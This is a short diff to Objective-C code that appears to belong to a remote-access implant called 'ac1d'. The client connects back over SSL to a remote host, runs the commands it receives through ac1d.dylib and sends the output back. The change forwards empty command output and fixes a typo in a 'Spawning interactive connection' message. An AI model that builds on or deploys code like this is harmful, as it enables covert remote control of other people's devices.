@@ -92,10 +92,9 @@ void interactWithServer(NSString *remoteHost, int remotePort) {
             }
             NSString *result = [ac1d_base sendCommand:command_args];
             if ([result isEqualToString:@"error"]) printf("[-] Failed to execute command, cannot find ac1d.dylib!\n");
-            else {
-                sendString(result);
-                SSL_write(client_ssl, terminator, (int)strlen(terminator));
-            }
+            if ([result isEqualToString:@""]) printf("[!] Command output empty, sending anyway.\n");
+            sendString(result);
+            SSL_write(client_ssl, terminator, (int)strlen(terminator));
         } else {
             printf("[-] Unrecognized command!\n");
             sendString(@"error");
@@ -133,7 +132,7 @@ void connectToServer(NSString *remoteHost, int remotePort) {
         printf("[-] Failed to handshake with SSL client!\n");
         return;
     }
-    printf("[*] Spwaning interactive connection...\n");
+    printf("[*] Spawning interactive connection...\n");
     interactWithServer(remoteHost, remotePort);
     printf("[-] Connection closed!\n");
 }
